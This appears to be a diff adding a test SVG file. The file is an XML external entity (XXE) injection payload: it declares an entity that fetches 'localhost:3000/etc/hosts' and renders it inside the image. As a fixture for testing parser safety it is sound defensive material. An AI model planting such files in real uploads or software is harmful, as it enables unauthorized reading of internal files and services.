@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://localhost:3000/etc/hosts">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text x="10" y="20">&xxe;</text>
+</svg>
